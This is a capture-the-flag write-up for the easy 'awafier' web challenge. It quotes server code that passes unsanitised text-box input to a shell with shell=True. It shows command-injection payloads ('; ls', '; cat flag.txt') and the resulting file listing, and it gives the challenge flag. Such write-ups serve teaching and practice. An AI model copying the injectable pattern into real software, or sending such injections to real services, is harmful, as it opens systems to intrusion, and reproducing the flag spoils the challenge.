# awafier
Point count: 100pts

Difficulty: easy

Provided files: awafier.zip

Url: https://awafy-me.jellyc.tf/

Description:
> Hacked this together for Jelly's mutually beneficial partnership application
#

There is a text box, so it should be sanitized, right?

```
if user_input:
        try:
            result = subprocess.check_output("python3 ./awafier.py " + user_input, shell=True)
            result = result.decode()
        except:
            result = "Error processing input"
    else:
        result = ""
```

The text box is not sanitized, and runs `python3 ./awafier.py {user_input}` in a shell. We can try sending `; ls`, and we get

```
Dockerfile
awafier.py
awafier_maps.py
flag.txt
main.py
requirements.txt
wrapper.py
```

which confirms the exploit. We can send `; cat flag.txt` to get the flag.

Flag: `jellyCTF{c3rt1fied_aw4t15tic}`
